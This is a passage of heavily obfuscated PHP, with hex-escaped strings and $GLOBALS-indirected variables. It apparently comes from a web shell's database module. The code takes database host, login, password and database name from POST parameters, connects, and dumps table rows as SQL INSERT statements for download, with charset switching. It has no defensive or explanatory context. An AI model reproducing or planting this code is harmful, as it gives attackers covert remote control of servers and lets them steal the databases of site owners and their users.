▟=$this->fetch()){${"\x47L\x4f\x42\x41\x4c\x53"}["\x63\x6fw\x63ug\x69\x78\x76\x6f"]="\x63o\x6c\x75\x6d\x6e\x73";${"\x47\x4c\x4fBA\x4c\x53"}["xmit\x77\x78\x63\x76"]="\x73\x71\x6c";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["l\x71oicciwuc\x6e"]="f\x70";$sgryemnnegn="\x63o\x6c\x75\x6d\x6es";${${"\x47\x4cOB\x41L\x53"}["c\x6f\x77\x63\x75g\x69xv\x6f"]}=array();foreach($▟as${${"\x47LOBAL\x53"}["\x76\x68\x69\x75n\x6b\x76\x6c\x69\x70w"]}=>${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x65\x62p\x77\x70\x79n\x7a\x67\x6c"]}){${"GL\x4f\x42\x41\x4c\x53"}["\x6btjqnu\x71l\x6d\x74"]="\x6b";$▟[${${"GLOBA\x4cS"}["\x6b\x74\x6a\x71\x6e\x75\x71l\x6d\x74"]}]="\x27".addslashes(${${"\x47LO\x42\x41L\x53"}["\x65\x62\x70\x77p\x79\x6e\x7a\x67\x6c"]})."'";${${"\x47LOB\x41\x4cS"}["\x76\x6d\x78\x66\x62\x72\x64"]}[]=${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x76\x68\x69u\x6e\x6b\x76\x6cip\x77"]};}$ntpmna="\x74a\x62\x6c\x65";${${"\x47\x4c\x4f\x42A\x4cS"}["\x71t\x64ejs\x77co\x77b\x74"]}="\x49N\x53ERT\x20INTO\x20".${$ntpmna}."\x20(".implode(", ",${$sgryemnnegn}).")\x20\x56A\x4cUE\x53 (".implode(", ",$▟).");"."\n";if(${${"GL\x4fB\x41\x4c\x53"}["l\x71\x6f\x69\x63\x63\x69wu\x63\x6e"]})fwrite(${${"GLO\x42\x41L\x53"}["\x72m\x65sq\x63ba\x64\x77q"]},${${"G\x4c\x4fBA\x4c\x53"}["q\x74d\x65\x6asw\x63\x6fw\x62t"]});else echo(${${"\x47\x4cO\x42\x41L\x53"}["\x78mit\x77x\x63\x76"]});}break;}return false;}}$elwmbrnxrcw="\x64b";${$elwmbrnxrcw}=new DbClass($_POST["type"]);if((@$_POST["p\x32"]=="d\x6f\x77\x6e\x6co\x61\x64")&&(@$_POST["p1"]!="\x73e\x6cect")){$db->connect($_POST["sq\x6c\x5f\x68\x6f\x73\x74"],$_POST["\x73q\x6c_\x6cogin"],$_POST["s\x71\x6c_\x70a\x73\x73"],$_POST["s\x71\x6c_b\x61se"]);$db->selectdb($_POST["sq\x6c_ba\x73e"]);switch($_POST["\x63\x68\x61\x72se\x74"]){case"\x57\x69\x6e\x64\x6fw\x73-12\x351":$db->setCharset("cp1\x325\x31");break;case"\x55T\x46-\x38":$db->setCharset("ut\x668");break;case"\x4bOI\x38-R":$db->setCharset("k\x6f\x69\x38r");break;case"\x4b\x4f\x498-U":$db->setCharset("ko\x698u");break;case"cp866":$db->setCharset("